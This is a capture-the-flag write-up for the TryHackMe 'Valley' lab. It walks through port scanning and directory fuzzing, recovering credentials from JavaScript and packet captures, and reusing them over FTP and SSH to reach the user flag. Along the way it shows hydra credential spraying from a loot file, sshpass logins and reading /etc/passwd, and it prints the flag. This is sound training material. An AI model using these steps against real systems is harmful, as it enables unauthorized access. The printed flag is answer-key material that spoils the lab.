# Recon
---
## Nmap

```bash
┌──(kali㉿kali)-[~/thm/valleype]
└─$ cat valleype.nmap
# Nmap 7.94 scan initiated Sun Jun 11 09:58:59 2023 as: nmap -sVC -p- -T4 -vv -oA valleype 10.10.83.16
Increasing send delay for 10.10.83.16 from 0 to 5 due to 2037 out of 5091 dropped probes since last increase.
Increasing send delay for 10.10.83.16 from 5 to 10 due to 11 out of 16 dropped probes since last increase.
Nmap scan report for 10.10.83.16
Host is up, received echo-reply ttl 63 (0.28s latency).
Scanned at 2023-06-11 09:59:00 EDT for 1047s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU=
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg=
|   256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
37370/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 11 10:16:27 2023 -- 1 IP address (1 host up) scanned in 1048.80 seconds
```

## 80 - Valley Photo Co.

### Info

![](attachment/267ed9aa1e3afe6b8db2ae0a07d943d0.png)

![](attachment/00cabbe7a23e2eba030bedbbfa5fa262.png)

### Dir

```bash
┌──(kali㉿kali)-[~/thm/valleype]
└─$ feroxbuster -u http://10.10.83.16/ --burp
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       38l      129w     1163c http://10.10.83.16/index.html
200      GET       52l      106w      945c http://10.10.83.16/styles.css
200      GET      140l      394w     3940c http://10.10.83.16/gallery/gallery.html
200      GET       32l       61w      924c http://10.10.83.16/pricing/pricing.html
200      GET       38l      129w     1163c http://10.10.83.16/
301      GET        9l       28w      312c http://10.10.83.16/gallery => http://10.10.83.16/gallery/
301      GET        9l       28w      311c http://10.10.83.16/static => http://10.10.83.16/static/
200      GET        3l       10w       57c http://10.10.83.16/pricing/note.txt
301      GET        9l       28w      312c http://10.10.83.16/pricing => http://10.10.83.16/pricing/
[####################] - 6m     30014/30014   0s      found:9       errors:0
[####################] - 6m     30000/30000   83/s    http://10.10.83.16/
[####################] - 1s     30000/30000   49342/s http://10.10.83.16/gallery/ => Directory listing
[####################] - 1s     30000/30000   24019/s http://10.10.83.16/pricing/ => Directory listing
[####################] - 1s     30000/30000   50676/s http://10.10.83.16/static/ => Directory listing
```

# User Flag
---

### Credential In Javascript

There's a note.txt

```bash
http://10.10.83.16/pricing/note.txt
```

Content:

```txt
J,
Please stop leaving notes randomly on the website
-RP
```

Ok, focus on dir busting

Click on first image

![](attachment/5a98ca47f0a77adf284b64ab10bd13b4.png)

Fuzz the index: `http://10.10.83.16/static/1`

```bash
┌──(kali㉿kali)-[~/thm/valleype]
└─$ gobuster dir -u http://10.10.83.16/static/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e -r -t 100

http://10.10.83.16/static/.html                (Status: 403) [Size: 276]
http://10.10.83.16/static/.htm                 (Status: 403) [Size: 276]
http://10.10.83.16/static/.                    (Status: 200) [Size: 565]
http://10.10.83.16/static/.htaccess            (Status: 403) [Size: 276]
http://10.10.83.16/static/3                    (Status: 200) [Size: 421858]
http://10.10.83.16/static/1                    (Status: 200) [Size: 2473315]
http://10.10.83.16/static/6                    (Status: 200) [Size: 2115495]
http://10.10.83.16/static/11                   (Status: 200) [Size: 627909]
http://10.10.83.16/static/9                    (Status: 200) [Size: 1190575]
http://10.10.83.16/static/5                    (Status: 200) [Size: 1426557]
http://10.10.83.16/static/.htc                 (Status: 403) [Size: 276]
http://10.10.83.16/static/00                   (Status: 200) [Size: 127]
http://10.10.83.16/static/16                   (Status: 200) [Size: 2468462]
...
```

 `00` seems interesting

Content:

```bash
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

![](attachment/a6a79237407a4d4a815554e462b4cc89.png)

Check source code

![](attachment/7940fdff32de3bfdcd7ac43d6e830bba.png)

In `dev.js`

![](attachment/f1be3009fb1d03643ba07458354b9789.png)

Get Credential: `siemDev`:`california`

after login, get redirected to `http://10.10.83.16/dev1243224123123/devNotes37370.txt`

```bash
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

- stop reusing credentials

### Connect to FTP

```bash
┌──(kali㉿kali)-[~/thm/valleype]
└─$ ftp ftp://siemDev:california@10.10.83.16:37370
Connected to 10.10.83.16.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||6320|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
226 Directory send OK.
ftp> mget *
mget siemFTP.pcapng [anpqy?]? a
Prompting off for duration of mget.
```

### Analyze pcap

Tried **PyCredz** to discover some interesting data

```bash
┌──(kali㉿kali)-[~/thm/valleype]
└─$ python3 /opt/sectools/discovery/PCredz/Pcredz -d siem_logs
```

> Nothing found

Use [pywhat](https://github.com/bee-san/pyWhat) to analyze packets

```bash
pywhat siemHTTP2.pcapng
```

![](attachment/7f212bea919f172e1cad4af73c903837.png)

Analyzed all 3 files, nothing very important found though

> Using wireshark to analyze those packets might take some time

Use **bettercap** and utilize its `net.sniff` module to parse packets quickly 

```bash
┌──(kali㉿kali)-[~/thm/valleype]
└─$ sudo bettercap
bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]

192.168.0.0/24 > 192.168.0.183  » [12:26:11] [sys.log] [inf] gateway monitor started ...
192.168.0.0/24 > 192.168.0.183  »
192.168.0.0/24 > 192.168.0.183  » set net.sniff.source /home/kali/thm/valleype/siemHTTP2.pcapng
192.168.0.0/24 > 192.168.0.183  » net.sniff on
```

![](attachment/20e864afd2a5c206486b3e6fba2e1c56.png)

Creds:

```bash
uname=valleyDev&psw=ph0t0s1234&remember=on
```

> `uname` and `psw` will escape from many regex, clever creator

### Login to SSH

Password reuse

```bash
┌──(kali㉿kali)-[~/thm/valleype]
└─$ sshpass -p ph0t0s1234 ssh -o "StrictHostKeyChecking no" valleyDev@10.10.83.16
Warning: Permanently added '10.10.83.16' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ id
uid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev)
valleyDev@valley:~$ cat user.txt
THM{k@l1_1n_th3_v@lley}
```

> [!NOTE] Save Loots
> Remember to save all the creds gathered from target for password reuse attacks
> ```bash
> hydra -t 4 -C ./loot/creds.txt ssh://10.10.49.207
> ```
> ![](attachment/7daea92837bc254364b359696b3962ec.png)
> ```bash
> hydra -t 4 -C ./loot/creds.txt ftp://10.10.49.207:37370
> ```
> ![](attachment/f3e4ba9f0dbe5158621b195da8eae89a.png)

# Root Flag
---

Start basic enumeration

```bash
valleyDev@valley:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
valley:x:1000:1000:,,,:/home/valley:/bin/bash
siemDev:x:1001:1001::/home/siemDev/ftp:/bin/sh
valleyDev:x:1002:1002::/home/valleyDev:/bin/bash
```

